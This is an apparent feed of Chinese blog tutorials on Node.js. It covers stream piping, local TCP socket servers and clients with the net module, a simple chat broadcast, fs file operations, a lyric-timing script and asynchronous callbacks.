title="5.2.3使用pipe()处理大文件"></a>5.2.3使用pipe()处理大文件</h2><p>在使用大文件复制的案例中，通过可读流的chunk参数来传递数据，如果把数据比作是水，chunk相当于盆，使用盆来完成水的传递。可读流中还有一个函数叫做pipe()，这个函数是一个很高效的文件处理方式，简化复制文件的操作，“把盆换成了管子”。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">let</span> srcPath = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">let</span> distPath = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">let</span> readableStream = fs.createReadStream(srcPath);</span><br><span class="line"><span class="keyword">let</span> writableStream = fs.createWriteStream(distPath);</span><br><span class="line"><span class="comment">//可以通过使用可读流函数pipe()接入到可写流中</span></span><br><span class="line"><span class="keyword">if</span>(readableStream.pipe(writableStream))&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'复制成功'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'复制失败'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>数据与文件的处理是服务器端编程与客户端编程的本质区别所在。</p>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Node.js网络编程</title>
      <link href="2019/05/05/Node.js-Node.js%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
      <url>2019/05/05/Node.js-Node.js%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="6-1-Node-js网络编程基础"><a href="#6-1-Node-js网络编程基础" class="headerlink" title="6.1 Node.js网络编程基础"></a>6.1 Node.js网络编程基础</h1><h2 id="6-1-1-IP地址和端口号"><a href="#6-1-1-IP地址和端口号" class="headerlink" title="6.1.1 IP地址和端口号"></a>6.1.1 IP地址和端口号</h2><p>通过IP地址可以找到服务器设备，而端口号可以理解为在发送数据时定位到不同服务器应用程序的标识。</p><p>IP地址对于计算机是唯一的，一个端口号也只能被一个应用程序所占用。</p><h2 id="6-1-2-套接字Socket简单模型"><a href="#6-1-2-套接字Socket简单模型" class="headerlink" title="6.1.2 套接字Socket简单模型"></a>6.1.2 套接字Socket简单模型</h2><p>先了解一下TCP/IP协议，TCP（Transfer Control Protocol）传输控制协议是一种稳定可靠的传送方式，TCP负责发现传输的问题，一有问题就发出信号，要求重新传输，直到所有数据安全正确地传输到目的地为止。</p><p>Socket原意为孔或插座。在程序方面可理解为接口对象，在网络编程中通常称为套接字，常用于描述IP地址和端口等。Socket是支持TCP/IP的网络通信的基本操作单元。<strong>简单理解，Socket就是对TCP/IP协议的封装，Socket本身并不是协议，而是一个调用接口</strong></p><p>Socket需要使用套接字地址来展开工作，套接字地址就是IP地址和端口号的组合，套接字服务与其他服务不同，不需要处理网络中的GET或POST请求，而是采用点对点传输数据方式。</p><h2 id="6-1-3-Node-js名字的由来"><a href="#6-1-3-Node-js名字的由来" class="headerlink" title="6.1.3 Node.js名字的由来"></a>6.1.3 Node.js名字的由来</h2><p>Node.js诞生的目的就是为了更加高效的处理网络数据，因为使用它进行网络编程时不需要使用其他的服务器软件进行支持，Node.js本身就是一个服务器。在进行网络编程时，每一个进程构成网络应用中的一个结点，而Node就是结点的意思，最终web.js更名为Node.js。</p><h1 id="6-2-Node-js中实现套接字服务"><a href="#6-2-Node-js中实现套接字服务" class="headerlink" title="6.2 Node.js中实现套接字服务"></a>6.2 Node.js中实现套接字服务</h1><p>套接字服务由Net模块提供：</p><p><code>let net = require(&#39;net&#39;);</code></p><h2 id="6-2-1-Net-Server对象"><a href="#6-2-1-Net-Server对象" class="headerlink" title="6.2.1 Net.Server对象"></a>6.2.1 Net.Server对象</h2><p><code>let server = net.creatServer()</code></p><p>当Server对象被创建后，在该服务器的生命周期中就存在了一些可触发的事件。</p><table><thead><tr><th>事件</th><th>描述</th></tr></thead><tbody><tr><td>listening</td><td>当服务器调用server.listen绑定后会触发</td></tr><tr><td>connection</td><td>当新连接创建后会被触发</td></tr><tr><td>close</td><td>服务器关闭时会被触发</td></tr><tr><td>error</td><td>发生错误时触发</td></tr></tbody></table><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>);</span><br><span class="line"><span class="keyword">let</span> server = net.createServer();</span><br><span class="line">server.on(<span class="string">'connection'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'有客户端连接上来了'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">server.on(<span class="string">'listening'</span>,<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'服务器监听成功了，正在等待客户端连接'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">server.listen(<span class="number">3000</span>,<span class="string">'127.0.0.1'</span>);</span><br></pre></td></tr></table></figure><p>然后启用Telnet客户端服务，命令行中输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 127.0.0.1 3000</span><br></pre></td></tr></table></figure><p>就会连接成功。</p><h2 id="6-2-2-Net-Socket对象"><a href="#6-2-2-Net-Socket对象" class="headerlink" title="6.2.2 Net.Socket对象"></a>6.2.2 Net.Socket对象</h2><p> Net.Socket实例实现了一Duplex（双工）流接口，提供了Writable和Readable所有功能，所以说它既是可读流也是可写流。</p><p> Net.Socket对象同时在套接字服务器和客户端上创建，并且会允许数据在他们之间进行读取和写入，一旦Socket对象被创建，就提供了一些触发的事件。</p><table><thead><tr><th>事件</th><th>描述</th></tr></thead><tbody><tr><td>lookup</td><td>解析域名后，连接前触发</td></tr><tr><td>connect</td><td>成功建立socket连接时触发</td></tr><tr><td>data</td><td>当收到数据时触发</td></tr><tr><td>end</td><td>当socket另一点发送FIN包时</td></tr><tr><td>timeout</td><td>socket空闲超时</td></tr><tr><td>drain</td><td>写缓存为空的时候触发。</td></tr><tr><td>error</td><td>发生错误。</td></tr><tr><td>close</td><td>socket关闭</td></tr></tbody></table><ol><li>服务器向客户端发送消息</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>);</span><br><span class="line"><span class="keyword">let</span> server = net.createServer();</span><br><span class="line">server.on(<span class="string">'connection'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">socket</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'有客户端连接上来了'</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'客户端IP地址：'</span>+socket.remoteAddress+<span class="string">'连接到了当前服务器'</span>);</span><br><span class="line">    socket.write(<span class="string">'hello'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">server.on(<span class="string">'listening'</span>,<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'服务器监听成功了，正在等待客户端连接'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">server.listen(<span class="number">3000</span>,<span class="string">'127.0.0.1'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//然后启用Telnet客户端服务，命令行中输入：</span></span><br><span class="line"><span class="comment">//telnet 127.0.0.1 3000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//服务端输出</span></span><br><span class="line"><span class="comment">//服务器监听成功了，正在等待客户端连接</span></span><br><span class="line"><span class="comment">//有客户端连接上来了</span></span><br><span class="line"><span class="comment">//客户端IP地址：127.0.0.1连接到了当前服务器</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//客户端输出</span></span><br><span class="line"><span class="comment">//hello</span></span><br></pre></td></tr></table></figure><ol start="2"><li>统计在线人数</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>);</span><br><span class="line"><span class="keyword">let</span> server = net.createServer();</span><br><span class="line"><span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">server.on(<span class="string">'connection'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">socket</span>)</span>&#123;</span><br><span class="line">    count++;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'welcome,当前在线人数：'</span>+count);</span><br><span class="line">    socket.write(<span class="string">'remoteAddress'</span>+socket.remoteAddress+<span class="string">'\n'</span>);</span><br><span class="line">    socket.write(<span class="string">'remotePort'</span>+socket.remotePort);</span><br><span class="line">&#125;);</span><br><span class="line">server.listen(<span class="number">3000</span>,<span class="string">'127.0.0.1'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'server listening at port 3000'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//然后启用两个Telnet客户端服务，命令行中输入：</span></span><br><span class="line"><span class="comment">//telnet 127.0.0.1 3000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//服务端输出</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">server listening at port 3000</span></span><br><span class="line"><span class="comment">welcome,当前在线人数：1</span></span><br><span class="line"><span class="comment">welcome,当前在线人数：2</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><ol start="3"><li>客户端与服务端双向通信</li></ol><p>创建客户端<code>net.creatConnection()</code>执行完毕会返回一个socket对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//服务端</span></span><br><span class="line"><span class="keyword">let</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>);</span><br><span class="line"><span class="keyword">let</span> server = net.createServer();</span><br><span class="line">server.on(<span class="string">'connection'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">socket</span>)</span>&#123;</span><br><span class="line">    socket.on(<span class="string">'data'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(data.toString());</span><br><span class="line">        socket.write(<span class="string">'我吃的小豆包'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">server.listen(<span class="number">3000</span>,<span class="string">'127.0.0.1'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'server listening at port 3000'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//客户端</span></span><br><span class="line"><span class="keyword">let</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>);</span><br><span class="line"><span class="keyword">let</span> client = net.createConnection(&#123;</span><br><span class="line">    port:<span class="number">3000</span></span><br><span class="line">&#125;);</span><br><span class="line">client.on(<span class="string">'connect'</span>,<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'客户端与服务器连接成功了'</span>);</span><br><span class="line">    client.write(<span class="string">'你吃了吗'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">client.on(<span class="string">'data'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(data.toString());</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h1 id="6-3-Node-js进程管理"><a href="#6-3-Node-js进程管理" class="headerlink" title="6.3 Node.js进程管理"></a>6.3 Node.js进程管理</h1><h2 id="6-3-1-Process模块获取终端输入"><a href="#6-3-1-Process模块获取终端输入" class="headerlink" title="6.3.1 Process模块获取终端输入"></a>6.3.1 Process模块获取终端输入</h2><p>如果需要在客户端输入信息发送到服务器，这样的功能就需要依赖Process模块来完成。</p><p>Process模块是一个无须使用require就可以访问的全局对象。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">process.stdin.on(<span class="string">'data'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(data.toString().trim());<span class="comment">//trim是去掉输入后按的空格</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="6-3-2-多人广播消息"><a href="#6-3-2-多人广播消息" class="headerlink" title="6.3.2 多人广播消息"></a>6.3.2 多人广播消息</h2><p>服务端接收客户端消息，将客户端消息发送给其他客户端</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//服务端</span></span><br><span class="line"><span class="keyword">let</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>);</span><br><span class="line"><span class="keyword">let</span> server = net.createServer();</span><br><span class="line"><span class="comment">//该数组用来封装所有客户端的scoket</span></span><br><span class="line"><span class="keyword">let</span> users = [];</span><br><span class="line">server.on(<span class="string">'connection'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">socket</span>) </span>&#123;</span><br><span class="line">    users.push(socket);</span><br><span class="line">    socket.on(<span class="string">'data'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">        data = data.toString().trim();</span><br><span class="line">        users.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">client</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(client !== socket)&#123;</span><br><span class="line">                <span class="comment">//不同客户端端口号不同</span></span><br><span class="line">                client.write(client.remotePort+<span class="string">':'</span>+data);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    socket.on(<span class="string">'error'</span>,<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'有客户端退出了'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br><span class="line">server.listen(<span class="number">3000</span>,<span class="string">'127.0.0.1'</span>,<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'server listening at port 3000'</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//客户端</span></span><br><span class="line"><span class="keyword">let</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>);</span><br><span class="line"><span class="comment">//向服务端创建连接</span></span><br><span class="line"><span class="keyword">let</span> client = net.createConnection(&#123;</span><br><span class="line">    port:<span class="number">3000</span>,</span><br><span class="line">    host:<span class="string">'127.0.0.1'</span></span><br><span class="line">&#125;);</span><br><span class="line">client.on(<span class="string">'connect'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//通过当前进程的标准输入的data事件获取终端的输入</span></span><br><span class="line">    process.stdin.on(<span class="string">'data'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">        data = data.toString().trim();</span><br><span class="line">        client.write(data);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">client.on(<span class="string">'data'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(data.toString());</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//打开多个客户端，即可互相发送消息</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Node.js文件操作</title>
      <link href="2019/05/04/Node.js-Node.js%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"/>
      <url>2019/05/04/Node.js-Node.js%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p>Node.js的文件操作API由fs（File System）模块提供，该模块提供的函数均有异步和同步版本，例如读取文件内容的函数有异步的fs.readFile()和同步的fs.readFileSync()。实际开发中建议大家使用异步函数，性能更高，速度更快，而且没有阻塞。</p><h2 id="同步文件写入"><a href="#同步文件写入" class="headerlink" title="同步文件写入"></a>同步文件写入</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//同步API必须使用try...catch来捕获异常</span></span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'写入文件...'</span>);</span><br><span class="line">    fs.writeFileSync(<span class="string">'路径'</span>,<span class="string">'内容'</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'不好意思，文件写入失败了'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="异步文件写入"><a href="#异步文件写入" class="headerlink" title="异步文件写入"></a>异步文件写入</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//异步文件写入函数多了一个回调函数</span></span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">1</span>);</span><br><span class="line"><span class="comment">//该方法中回调函数的第一个参数为错误对象</span></span><br><span class="line">fs.write(<span class="string">'路径'</span>,<span class="string">'内容'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">err</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'不好意思，文件写入失败了'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">2</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">3</span>);</span><br><span class="line"><span class="comment">//输出132</span></span><br></pre></td></tr></table></figure><p>其他的一些文件操作在此就不细写了，上网随时可查，下面做一个实际例子。</p><h2 id="控制歌词滚动"><a href="#控制歌词滚动" class="headerlink" title="控制歌词滚动"></a>控制歌词滚动</h2><p>歌词格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[ti:自由(Live)]</span><br><span class="line">[ar:梁咏琪]</span><br><span class="line">[al:蒙面歌王第八期]</span><br><span class="line">[by:果果1314]</span><br><span class="line">[00:00.00]梁咏琪 - 自由(Live)</span><br><span class="line">[00:03.00]歌词编辑：果果</span><br><span class="line">[00:06.00]QQ:765708831</span><br><span class="line">[00:09.00]Lrc歌词网：www.90lrc.cn</span><br><span class="line">[00:12.00]</span><br><span class="line">[00:16.65]也许会恨你</span><br><span class="line">[00:18.66]我知道我的脾气不是很好</span><br></pre></td></tr></table></figure><p>歌词随时间逐句输出</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line">fs.readFile(<span class="string">'./lrc.txt'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">err,data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(err)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">console</span>.log(<span class="string">'读取歌词文件失败了'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    data = data.toString();</span><br><span class="line">    <span class="keyword">let</span> lines = data.split(<span class="string">'\n'</span>);</span><br><span class="line">    <span class="comment">//正则匹配，解析出毫秒</span></span><br><span class="line">    <span class="comment">//需要里面的时间和里面的内容</span></span><br><span class="line">    <span class="keyword">let</span> reg = <span class="regexp">/\[(\d&#123;2&#125;)\:(\d&#123;2&#125;)\.(\d&#123;2&#125;)\]\s*(.+)/</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>;i &lt; lines.length;i++)&#123;</span><br><span class="line">        <span class="comment">//自执行函数</span></span><br><span class="line">        ;(<span class="function"><span class="keyword">function</span>(<span class="params">index</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">let</span> line = lines[index];</span><br><span class="line">            <span class="keyword">let</span> matches = reg.exec(line);</span><br><span class="line">            <span class="keyword">if</span>(matches)&#123;</span><br><span class="line">                <span class="keyword">let</span> m = <span class="built_in">parseFloat</span>(matches[<span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">let</span> s = <span class="built_in">parseFloat</span>(matches[<span class="number">2</span>]);</span><br><span class="line">                <span class="keyword">let</span> ms = <span class="built_in">parseFloat</span>(matches[<span class="number">3</span>]);</span><br><span class="line">                <span class="keyword">let</span> content = matches[<span class="number">4</span>];</span><br><span class="line">                <span class="keyword">let</span> time = m*<span class="number">60</span>*<span class="number">1000</span> + s*<span class="number">1000</span> +ms;</span><br><span class="line">                setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(content);</span><br><span class="line">                &#125;,time);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>异步资源和包资源管理</title>
      <link href="2019/05/03/Node.js-%E5%BC%82%E6%AD%A5%E8%B5%84%E6%BA%90%E5%92%8C%E5%8C%85%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86/"/>
      <url>2019/05/03/Node.js-%E5%BC%82%E6%AD%A5%E8%B5%84%E6%BA%90%E5%92%8C%E5%8C%85%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="3-1-异步编程"><a href="#3-1-异步编程" class="headerlink" title="3.1 异步编程"></a>3.1 异步编程</h1><p>JavaScript的执行环境是单线程的，单线程一次只能完成一个任务，如果有多个任务，就需要等待前面一个任务完成后，再执行后面的一个任务。常见的浏览器无响应就是某一段JS代码长时间运行造成的。</p><p>为解决单线程阻塞的问题，Node.js中加入了异步编程模块，保证了Node.js快速响应，充分利用CPU。</p><a id="more"></a><h2 id="3-1-1-同步和异步"><a href="#3-1-1-同步和异步" class="headerlink" title="3.1.1 同步和异步"></a>3.1.1 同步和异步</h2><ol><li>同步：代码按照顺序依次执行</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">'起床'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'背单词'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">eatBreakfast</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'早餐吃完了'</span>);</span><br><span class="line">&#125;</span><br><span class="line">eatBreakfast();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'去上学'</span>);</span><br></pre></td></tr></table></figure><ol start="2"><li>异步：</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">'起床'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'背单词'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">eatBreakfast</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'开始吃早餐了'</span>);</span><br><span class="line">    <span class="comment">//setTimeout是一个异步函数，不会阻塞后面代码的继续执行</span></span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'早餐吃完了'</span>);</span><br><span class="line">    &#125;,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">eatBreakfast();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'去上学'</span>);</span><br><span class="line"><span class="comment">//相当于边去学校，边吃早餐</span></span><br><span class="line"><span class="comment">//输出：起床，背单词，开始吃早餐了，去上学，早餐吃完了</span></span><br></pre></td></tr></table></figure><h2 id="3-1-2-回调函数"><a href="#3-1-2-回调函数" class="headerlink" title="3.1.2 回调函数"></a>3.1.2 回调函数</h2><p>回调函数是指函数可以被传递到另一个函数中，然后被调用的形式，典型的应用就是异步函数的异常处理。</p><ol><li>同步代码中使用try…catch处理异常</li></ol><figure class="highlight js"><table><tr><td 